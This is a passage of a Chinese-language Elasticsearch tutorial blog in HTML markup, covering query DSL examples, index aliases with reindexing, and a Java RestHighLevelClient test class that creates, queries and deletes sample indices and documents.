&quot;query&quot;:&#123;  </span><br><span class=\"line\">    &quot;match\\_all&quot;: &#123;&#125;  </span><br><span class=\"line\">  &#125;,  </span><br><span class=\"line\">  &quot;sort&quot;:&#123;  </span><br><span class=\"line\">    &quot;age&quot;:&#123;  </span><br><span class=\"line\">      &quot;order&quot;:&quot;desc&quot;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  &#125;,  </span><br><span class=\"line\">  &quot;from&quot;: 0,  </span><br><span class=\"line\">  &quot;size&quot;: 2  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">#查询-term  </span><br><span class=\"line\">GET \\_search  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;query&quot;:&#123;  </span><br><span class=\"line\">    &quot;term&quot;:&#123;  </span><br><span class=\"line\">      &quot;city&quot;:&quot;武汉&quot;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">#查询-terms 允许多个Term  </span><br><span class=\"line\">GET \\_search  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;query&quot;:&#123;  </span><br><span class=\"line\">    &quot;terms&quot;:&#123;  </span><br><span class=\"line\">      &quot;city&quot;:  </span><br><span class=\"line\">        \\[  </span><br><span class=\"line\">          &quot;武汉&quot;,  </span><br><span class=\"line\">          &quot;广州&quot;  </span><br><span class=\"line\">        \\]  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">GET \\_search  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;query&quot;: &#123;  </span><br><span class=\"line\">    &quot;match&quot;: &#123;  </span><br><span class=\"line\">      &quot;city&quot;: &quot;广州武汉&quot;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;    </span><br><span class=\"line\">  </span><br><span class=\"line\">GET \\_search  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;query&quot;: &#123;  </span><br><span class=\"line\">    &quot;query\\_string&quot;: &#123;  </span><br><span class=\"line\">      &quot;default\\_field&quot;: &quot;city&quot;,  </span><br><span class=\"line\">      &quot;query&quot;: &quot;广州武汉&quot;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">#-range 范围过滤  </span><br><span class=\"line\">#gt表示&gt; gte表示=&gt;  </span><br><span class=\"line\">#lt表示&lt; lte表示&lt;=  </span><br><span class=\"line\">GET \\_search  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;query&quot;:&#123;  </span><br><span class=\"line\">    &quot;range&quot;: &#123;  </span><br><span class=\"line\">      &quot;age&quot;: &#123;  </span><br><span class=\"line\">        &quot;gte&quot;: 30,  </span><br><span class=\"line\">        &quot;lte&quot;: 57  </span><br><span class=\"line\">      &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">#搜索 exists：是指包含某个域的数据检索  </span><br><span class=\"line\">GET \\_search  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;query&quot;: &#123;  </span><br><span class=\"line\">    &quot;exists&quot;:&#123;  </span><br><span class=\"line\">      &quot;field&quot;:&quot;address&quot;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">GET /user/\\_search  </span><br><span class=\"line\">#过滤搜索 bool   </span><br><span class=\"line\">#must : 多个查询条件的完全匹配,相当于 and。  </span><br><span class=\"line\">#must\\_not : 多个查询条件的相反匹配，相当于 not。  </span><br><span class=\"line\">#should : 至少有一个查询条件匹配, 相当于 or。  </span><br><span class=\"line\">GET \\_search  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;query&quot;: &#123;  </span><br><span class=\"line\">    &quot;bool&quot;: &#123;  </span><br><span class=\"line\">      &quot;must&quot;: \\[  </span><br><span class=\"line\">        &#123;  </span><br><span class=\"line\">          &quot;term&quot;: &#123;  </span><br><span class=\"line\">            &quot;city&quot;: &#123;  </span><br><span class=\"line\">              &quot;value&quot;: &quot;深圳&quot;  </span><br><span class=\"line\">            &#125;  </span><br><span class=\"line\">          &#125;  </span><br><span class=\"line\">        &#125;,  </span><br><span class=\"line\">        &#123;  </span><br><span class=\"line\">          &quot;range&quot;:&#123;  </span><br><span class=\"line\">            &quot;age&quot;:&#123;  </span><br><span class=\"line\">              &quot;gte&quot;:20,  </span><br><span class=\"line\">              &quot;lte&quot;:99  </span><br><span class=\"line\">            &#125;  </span><br><span class=\"line\">          &#125;  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">      \\]  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">#查询所有 match\\_all  </span><br><span class=\"line\">GET \\_search  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;query&quot;: &#123;  </span><br><span class=\"line\">    &quot;match\\_all&quot;: &#123;&#125;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">#字符串匹配  </span><br><span class=\"line\">GET \\_search  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;query&quot;: &#123;  </span><br><span class=\"line\">    &quot;match&quot;: &#123;  </span><br><span class=\"line\">      &quot;description&quot;: &quot;武汉广州&quot;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">#前缀匹配 prefix  </span><br><span class=\"line\">GET \\_search  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;query&quot;: &#123;  </span><br><span class=\"line\">    &quot;prefix&quot;: &#123;  </span><br><span class=\"line\">      &quot;name&quot;: &#123;  </span><br><span class=\"line\">        &quot;value&quot;: &quot;赵&quot;  </span><br><span class=\"line\">      &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">#多个域匹配搜索  </span><br><span class=\"line\">GET \\_search  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;query&quot;: &#123;  </span><br><span class=\"line\">    &quot;multi\\_match&quot;: &#123;  </span><br><span class=\"line\">      &quot;query&quot;: &quot;深圳&quot;,  </span><br><span class=\"line\">      &quot;fields&quot;: \\[  </span><br><span class=\"line\">        &quot;city&quot;,  </span><br><span class=\"line\">        &quot;description&quot;  </span><br><span class=\"line\">      \\]  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\">GET /user/\\_search  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;query&quot;: &#123;  </span><br><span class=\"line\">    &quot;bool&quot;: &#123;  </span><br><span class=\"line\">      &quot;filter&quot;: &#123;  </span><br><span class=\"line\">         &quot;range&quot;:&#123;  </span><br><span class=\"line\">          &quot;age&quot;:&#123;  </span><br><span class=\"line\">            &quot;gte&quot;:25,  </span><br><span class=\"line\">            &quot;lte&quot;: 80  </span><br><span class=\"line\">          &#125;  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">      &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"4-4-使用别名\"><a href=\"#4-4-使用别名\" class=\"headerlink\" title=\"4.4 使用别名\"></a>4.4 使用别名</h2><p>在mysql中 我们经常遇到产品修改需求 我们可能会在原有数据库表基础上 对字段 索引 类型进行修改比如 增加一个字段 添加一个字段的索引 又或者修改某个字段的类型，这一切都看起来这么自然 不过在ES这里却是行不通的 ES的mapping一旦设置了之后，可以改，但是改了没有用，因为ES默认是对所有字段进行索引 如果你修改了mapping 那么已经索引过的数据就必须全部重新索引一遍 , ES没有提供这个机制, 只能利用别名手工刷数据，</p>\n<ol>\n<li><strong>添加索引别名</strong></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">PUT article1/\\_alias/article  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">&quot;acknowledged&quot; : true  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li><strong>创建新article2索引（增加了一个owner字段）</strong></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">PUT article2  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">\t&quot;settings&quot;: &#123;  </span><br><span class=\"line\">\t\t&quot;number\\_of\\_shards&quot;: 3,  </span><br><span class=\"line\">\t\t&quot;number\\_of\\_replicas&quot;: 1 ,  </span><br><span class=\"line\">\t\t&quot;analysis&quot; : &#123;  </span><br><span class=\"line\">\t\t\t&quot;analyzer&quot; : &#123;  </span><br><span class=\"line\">\t\t\t\t&quot;ik&quot; : &#123;  </span><br><span class=\"line\">\t\t\t\t\t&quot;tokenizer&quot; : &quot;ik\\_max\\_word&quot;  </span><br><span class=\"line\">\t\t\t\t&#125;  </span><br><span class=\"line\">\t\t\t&#125;  </span><br><span class=\"line\">\t\t&#125;  </span><br><span class=\"line\">\t&#125;,  </span><br><span class=\"line\">\t&quot;mappings&quot;: &#123;  </span><br><span class=\"line\">\t\t&quot;properties&quot;: &#123;  </span><br><span class=\"line\">\t\t\t&quot;id&quot;: &#123;  </span><br><span class=\"line\">\t\t\t\t&quot;type&quot;: &quot;keyword&quot;  </span><br><span class=\"line\">\t\t\t&#125;,  </span><br><span class=\"line\">\t\t\t&quot;title&quot;: &#123;  </span><br><span class=\"line\">\t\t\t\t&quot;type&quot;: &quot;text&quot;,  </span><br><span class=\"line\">\t\t\t\t&quot;analyzer&quot;: &quot;ik\\_max\\_word&quot;  </span><br><span class=\"line\">\t\t\t&#125;,  </span><br><span class=\"line\">\t\t\t&quot;content&quot;: &#123;  </span><br><span class=\"line\">\t\t\t\t&quot;type&quot;: &quot;text&quot;,  </span><br><span class=\"line\">\t\t\t\t&quot;analyzer&quot;: &quot;ik\\_max\\_word&quot;  </span><br><span class=\"line\">\t\t\t&#125;,  </span><br><span class=\"line\">\t\t\t&quot;viewCount&quot;: &#123;  </span><br><span class=\"line\">\t\t\t\t&quot;type&quot;: &quot;integer&quot;  </span><br><span class=\"line\">\t\t\t&#125;,  </span><br><span class=\"line\">\t\t\t&quot;creatDate&quot;: &#123;  </span><br><span class=\"line\">\t\t\t\t&quot;type&quot;: &quot;date&quot;,  </span><br><span class=\"line\">\t\t\t\t&quot;format&quot;: &quot;yyyy-MM-dd HH:mm:ss||yyyy-MM-dd||epoch\\_millis&quot;  </span><br><span class=\"line\">\t\t\t&#125;,  </span><br><span class=\"line\">\t\t\t&quot;tags&quot;: &#123;  </span><br><span class=\"line\">\t\t\t\t&quot;type&quot;: &quot;keyword&quot;  </span><br><span class=\"line\">\t\t\t&#125;,   </span><br><span class=\"line\">\t\t\t&quot;owner&quot;: &#123;  </span><br><span class=\"line\">\t\t\t\t&quot;type&quot;: &quot;keyword&quot;  </span><br><span class=\"line\">\t\t\t&#125;  </span><br><span class=\"line\">\t\t&#125;  </span><br><span class=\"line\">\t&#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li><strong>重建索引 reindex</strong></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">POST \\_reindex  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">\t&quot;source&quot;: &#123;  </span><br><span class=\"line\">\t\t&quot;index&quot;: &quot;article1&quot;  </span><br><span class=\"line\">\t&#125;,  </span><br><span class=\"line\">\t&quot;dest&quot;: &#123;  </span><br><span class=\"line\">\t\t&quot;index&quot;: &quot;article2&quot;  </span><br><span class=\"line\">\t&#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li><strong>修改别名映射</strong></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">POST /\\_aliases  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">\t&quot;actions&quot;: \\[  </span><br><span class=\"line\">\t&#123;  </span><br><span class=\"line\">\t\t&quot;remove&quot;: &#123;  </span><br><span class=\"line\">\t\t\t&quot;index&quot;: &quot;article1&quot;,  </span><br><span class=\"line\">\t\t\t&quot;alias&quot;: &quot;article&quot;  </span><br><span class=\"line\">\t\t&#125;  </span><br><span class=\"line\">\t&#125;,  </span><br><span class=\"line\">\t&#123;  </span><br><span class=\"line\">\t\t&quot;add&quot;: &#123;  </span><br><span class=\"line\">\t\t\t&quot;index&quot;: &quot;article2&quot;,  </span><br><span class=\"line\">\t\t\t&quot;alias&quot;: &quot;article&quot;  </span><br><span class=\"line\">\t\t&#125;  </span><br><span class=\"line\">\t&#125;  </span><br><span class=\"line\">\t\\]  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"5\">\n<li>使用别名搜索</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">GET /article/\\_search  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">    &quot;query&quot;: &#123;  </span><br><span class=\"line\">    \t&quot;match\\_all&quot;: &#123;&#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"5-从0开始，ES工业级Java-应用开发\"><a href=\"#5-从0开始，ES工业级Java-应用开发\" class=\"headerlink\" title=\"5 从0开始，ES工业级Java 应用开发\"></a>5 从0开始，ES工业级Java 应用开发</h1><h2 id=\"5-1-High-Level-Client基本用法\"><a href=\"#5-1-High-Level-Client基本用法\" class=\"headerlink\" title=\"5.1 High Level Client基本用法\"></a>5.1 High Level Client基本用法</h2><p>High Level Client客户端是构建于 Low Level Client之上的封装。</p>\n<p>类似于Hibernate和JDBC的关系。</p>\n<p>使用Spring Data ElasticSearch访问ElastiSearch,注意版本对应关系</p>\n<p><img src=\"/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/20.png\"><br>spring boot 2.6.1对应的ES版本<br><img src=\"/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/21.png\"><br>High Level Client客户端测试案例</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.NONE)  </span><br><span class=\"line\">public class RestHighLevelClientTest  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    //用来操作 Elasticsearch 服务器的一个客户端对象类  </span><br><span class=\"line\">    @Autowired  </span><br><span class=\"line\">    private RestHighLevelClient restHLClient;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    @ParameterizedTest  </span><br><span class=\"line\">    @ValueSource(ints = &#123;1, 2, 3&#125;)  </span><br><span class=\"line\">    void testWithSimpleValueSource(int argument) &#123;  </span><br><span class=\"line\">        System.out.println(&quot;Parameterized test with value: &quot; + argument);  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    @Test  </span><br><span class=\"line\">    @SneakyThrows  </span><br><span class=\"line\">    void testWithSneakyThrows() &#123;  </span><br><span class=\"line\">        throw new Exception(&quot;This exception is sneaky thrown!&quot;);  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    @ParameterizedTest  </span><br><span class=\"line\">    @CsvSource(&#123;&quot;1, 1, 2&quot;, &quot;2, 3, 5&quot;, &quot;3, 5, 8&quot;&#125;)  </span><br><span class=\"line\">    void testAddition(int a, int b, int result) &#123;  </span><br><span class=\"line\">        int sum = a + b;  </span><br><span class=\"line\">        Assertions.assertEquals(result, sum, &quot;Sum of &quot; + a + &quot; and &quot; + b + &quot; should be &quot; + result);  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    //创建三个索引库  </span><br><span class=\"line\">    @ParameterizedTest //参数测试  </span><br><span class=\"line\">    @SneakyThrows  </span><br><span class=\"line\">    @ValueSource(strings = &#123;&quot;books&quot;, &quot;items&quot;, &quot;users&quot;&#125;)  </span><br><span class=\"line\">    public void testCreateIndex(String indexName)  </span><br><span class=\"line\">    &#123;  </span><br><span class=\"line\">  </span><br><span class=\"line\">        //指定分词器创建索引库的json格式的数据，每一行用双引号包起来，然后里面的每个双引号前面用反斜杠\\\\转义  </span><br><span class=\"line\">        String json = &quot;&#123;&quot; +  </span><br><span class=\"line\">                &quot;\\\\&quot;settings\\\\&quot;: &#123;&quot; +  </span><br><span class=\"line\">                &quot;    \\\\&quot;analysis\\\\&quot;: &#123;&quot; +  </span><br><span class=\"line\">                &quot;      \\\\&quot;analyzer\\\\&quot;: &#123;&quot; +  </span><br><span class=\"line\">                &quot;        \\\\&quot;default\\\\&quot;: &#123;&quot; +  </span><br><span class=\"line\">                &quot;           \\\\&quot;tokenizer\\\\&quot;: \\\\&quot;ik\\_max\\_word\\\\&quot;&quot; +  </span><br><span class=\"line\">                &quot;        &#125;&quot; +  </span><br><span class=\"line\">                &quot;      &#125;&quot; +  </span><br><span class=\"line\">                &quot;    &#125;&quot; +  </span><br><span class=\"line\">                &quot;  &#125;&quot; +  </span><br><span class=\"line\">                &quot;&#125;&quot;;  </span><br><span class=\"line\">  </span><br><span class=\"line\">        CreateIndexRequest request = new CreateIndexRequest(indexName)  </span><br><span class=\"line\">                //参数1：指定创建索引库时要传入的参数  ； 参数2：指定传入内容的类型  </span><br><span class=\"line\">                .source(json, XContentType.JSON);  </span><br><span class=\"line\">        //创建索引库后返回的响应类型--CreateIndexResponse  </span><br><span class=\"line\">        CreateIndexResponse resp = restHLClient.indices().create(request, RequestOptions.DEFAULT);  </span><br><span class=\"line\">  </span><br><span class=\"line\">        //获取Elasticsearch服务器的响应，就是响应索引库是否创建成功  </span><br><span class=\"line\">        System.err.println(resp.isAcknowledged());  </span><br><span class=\"line\">  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\">    //删除索引库  </span><br><span class=\"line\">    @SneakyThrows  </span><br><span class=\"line\">    @ParameterizedTest  </span><br><span class=\"line\">    @ValueSource(strings = &#123;&quot;items&quot;, &quot;users&quot;&#125;)  </span><br><span class=\"line\">    public void testDeleteIndex(String indexName)  </span><br><span class=\"line\">    &#123;  </span><br><span class=\"line\">        //删除索引的请求数据  </span><br><span class=\"line\">        DeleteIndexRequest request = new DeleteIndexRequest(indexName);  </span><br><span class=\"line\">        //客户端调用操作索引的方法，然后再调用删除的方法  </span><br><span class=\"line\">        AcknowledgedResponse resp = restHLClient.indices().delete(request, RequestOptions.DEFAULT);  </span><br><span class=\"line\">        //查看删除后的响应  </span><br><span class=\"line\">        System.err.println(resp.isAcknowledged());  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    //查询所有的索引库  </span><br><span class=\"line\">    @SneakyThrows  </span><br><span class=\"line\">    @Test //这个测试不需要参数，直接用这个@Test注解即可  </span><br><span class=\"line\">    public void testGetIndex()  </span><br><span class=\"line\">    &#123;  </span><br><span class=\"line\">        //参数 &quot;\\*&quot; ： 表示匹配所有的索引库  </span><br><span class=\"line\">        GetIndexRequest request = new GetIndexRequest(&quot;\\*&quot;);  </span><br><span class=\"line\">        //用rest客户端的方法来查询  </span><br><span class=\"line\">        GetIndexResponse resp = restHLClient.indices().get(request, RequestOptions.DEFAULT);  </span><br><span class=\"line\">        //返回的索引库是一个String类型的数组  </span><br><span class=\"line\">        String\\[\\] indices = resp.getIndices();  </span><br><span class=\"line\">        //把数组转成字符串  </span><br><span class=\"line\">        String s = Arrays.toString(indices);  </span><br><span class=\"line\">        System.err.println(s);  </span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    //往索引库添加文档  </span><br><span class=\"line\">  </span><br><span class=\"line\">    @ParameterizedTest  </span><br><span class=\"line\">    @SneakyThrows  </span><br><span class=\"line\">    //测试参数有多个值 ，用这个注解  </span><br><span class=\"line\">    @CsvSource(&#123;  </span><br><span class=\"line\">            &quot;1,火影忍者,旋涡鸣人成长为第七代火影的故事,150&quot;,  </span><br><span class=\"line\">            &quot;2,家庭教师,废材纲成长为十代首领的热血事迹,200&quot;,  </span><br><span class=\"line\">            &quot;4,七龙珠Z,超级赛亚人贝吉塔来到地球后的热闹景象,400&quot;  </span><br><span class=\"line\">    &#125;)  </span><br><span class=\"line\">    public void testSaveDocument(Integer id, String title, String description, Double price)  </span><br><span class=\"line\">    &#123;  </span><br><span class=\"line\">        //表明向 books 索引库添加文档  </span><br><span class=\"line\">        IndexRequest request = new IndexRequest(&quot;books&quot;)  </span><br><span class=\"line\">                .id(id + &quot;&quot;)  </span><br><span class=\"line\">                .source(  </span><br><span class=\"line\">                        &quot;title&quot;, title,  </span><br><span class=\"line\">                        &quot;description&quot;, description,  </span><br><span class=\"line\">                        &quot;price&quot;, price  </span><br><span class=\"line\">                );  </span><br><span class=\"line\">  </span><br><span class=\"line\">        IndexResponse resp = restHLClient.index(request, RequestOptions.DEFAULT);  </span><br><span class=\"line\">        System.err.println(resp);  </span><br><span class=\"line\">  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\">    //根据文档的id获取文档  </span><br><span class=\"line\">    @SneakyThrows  </span><br><span class=\"line\">    @ParameterizedTest  </span><br><span class=\"line\">    @ValueSource(ints = &#123;1, 3&#125;)  </span><br><span class=\"line\">    public void testGetDocumentById(Integer id)  </span><br><span class=\"line\">    &#123;  </span><br><span class=\"line\">        //表明从 books 索引库获取文档  </span><br><span class=\"line\">        GetRequest request = new GetRequest(&quot;books&quot;)  </span><br><span class=\"line\">                //表明根据指定的文档的id获取文档  </span><br><span class=\"line\">                .id(id + &quot;&quot;);  </span><br><span class=\"line\">  </span><br><span class=\"line\">        GetResponse resp = restHLClient.get(request, RequestOptions.DEFAULT);  </span><br><span class=\"line\">  </span><br><span class=\"line\">        System.err.println(resp);  </span><br><span class=\"line\">  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    //根据条件查询文档（普通关键字查询和通配符查询）  </span><br><span class=\"line\">  </span><br><span class=\"line\">    @SneakyThrows  </span><br><span class=\"line\">    @ParameterizedTest  </span><br><span class=\"line\">    @CsvSource(&#123;  </span><br><span class=\"line\">            &quot;description,热\\*&quot;,  </span><br><span class=\"line\">            &quot;description,成长&quot;  </span><br><span class=\"line\">    &#125;)  </span><br><span class=\"line\">    public void testSearchDocument(String field, String term)  </span><br><span class=\"line\">    &#123;  </span><br><span class=\"line\">        // 构建查询条件的类  </span><br><span class=\"line\">        SearchSourceBuilder builder = new SearchSourceBuilder();  </span><br><span class=\"line\">  </span><br><span class=\"line\">        // 通过 SearchSourceBuilder 可以用面向对象的方式来构建查询的 JSON 字符串  </span><br><span class=\"line\">        // SearchSourceBuilder 需要传入 QueryBuilders，而 QueryBuilders 用于构建 QueryBuilder  </span><br><span class=\"line\">        if (term != null &amp;&amp; term.contains(&quot;\\*&quot;))  </span><br><span class=\"line\">        &#123;  </span><br><span class=\"line\">            //根据字段和通配符关键字查询  </span><br><span class=\"line\">            builder.query(QueryBuilders.wildcardQuery(field, term));  </span><br><span class=\"line\">        &#125; else  </span><br><span class=\"line\">        &#123;  </span><br><span class=\"line\">            //根据字段和普通关键字查询  </span><br><span class=\"line\">            builder.query(QueryBuilders.matchQuery(field,term));  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">        //表明从 books 索引库查询文档  </span><br><span class=\"line\">        SearchRequest request = new SearchRequest(&quot;books&quot;)  </span><br><span class=\"line\">                // 此处的 builder 参数用于构建查询语法  </span><br><span class=\"line\">                .source(builder);  </span><br><span class=\"line\">  </span><br><span class=\"line\">        //客户端调用查询的方法 ， 参数1：查询条件语法  参数2：默认的请求选项，比如超时时间之类的  </span><br><span class=\"line\">        SearchResponse resp = restHLClient.search(request, RequestOptions.DEFAULT);  </span><br><span class=\"line\">  </span><br><span class=\"line\">        System.err.println(resp);  </span><br><span class=\"line\">  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\">    //根据 id 删除文档  </span><br><span class=\"line\">  </span><br><span class=\"line\">    @ParameterizedTest  </span><br><span class=\"line\">    @SneakyThrows  </span><br><span class=\"line\">    @ValueSource(ints = &#123;3,4&#125;)  </span><br><span class=\"line\">    public void testDeleteDocumentById(Integer id)  </span><br><span class=\"line\">    &#123;  </span><br><span class=\"line\">        //表明从 books 索引库删除文档  </span><br><span class=\"line\">        DeleteRequest request = new DeleteRequest(&quot;books&quot;)  </span><br><span class=\"line\">                //获取指定id的文档  </span><br><span class=\"line\">                .id(id+&quot;&quot;);  </span><br><span class=\"line\">        //rest客户端调用删除文档的方法  </span><br><span class=\"line\">        DeleteResponse resp = restHLClient.delete(request, RequestOptions.DEFAULT);  </span><br><span class=\"line\">        System.err.println(resp);  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"5-2-聚合查询\"><a href=\"#5-2-聚合查询\" class=\"headerlink\" title=\"5.2 聚合查询\"></a>5.2 聚合查询</h2><h3 id=\"5-2-1-DSL聚合查询\"><a href=\"#5-2-1-DSL聚合查询\" class=\"headerlink\" title=\"5.2.1 DSL聚合查询\"></a>5.2.1 DSL聚合查询</h3><ol>\n<li>创建测试索引</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">PUT /jh\\_test  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">\t&quot;settings&quot;: &#123;&#125;,  </span><br><span class=\"line\">\t&quot;mappings&quot;: &#123;  </span><br><span class=\"line\">\t\t&quot;properties&quot;: &#123;  </span><br><span class=\"line\">\t\t\t&quot;name&quot;: &#123;  </span><br><span class=\"line\">\t\t\t\t&quot;type&quot;: &quot;text&quot;,  </span><br><span class=\"line\">                &quot;fields&quot;: &#123;  </span><br><span class=\"line\">                    &quot;keyword&quot;: &#123;  </span><br><span class=\"line\">                        &quot;type&quot;: &quot;keyword&quot;,  </span><br><span class=\"line\">                        &quot;ignore\\_above&quot;: 256  </span><br><span class=\"line\">                    &#125;  </span><br><span class=\"line\">                &#125;  </span><br><span class=\"line\">\t\t\t&#125;,  </span><br><span class=\"line\">\t\t\t&quot;sex&quot;: &#123;  </span><br><span class=\"line\">\t\t\t\t&quot;type&quot;: &quot;keyword&quot;  </span><br><span class=\"line\">\t\t\t&#125;,  </span><br><span class=\"line\">\t\t\t&quot;buyCount&quot;: &#123;  </span><br><span class=\"line\">\t\t\t\t&quot;type&quot;: &quot;long&quot;  </span><br><span class=\"line\">\t\t\t&#125;,  </span><br><span class=\"line\">            &quot;createMonth&quot;:&#123;  </span><br><span class=\"line\">                &quot;type&quot;:&quot;keyword&quot;  </span><br><span class=\"line\">            &#125;  </span><br><span class=\"line\">\t\t&#125;  </span><br><span class=\"line\">\t&#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>其中字段的含义为：name：姓名、buyCount：购买数量，sex：性别，createMonth：创建月 添加测试数据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">POST /jh\\_test/\\_doc/1  </span><br><span 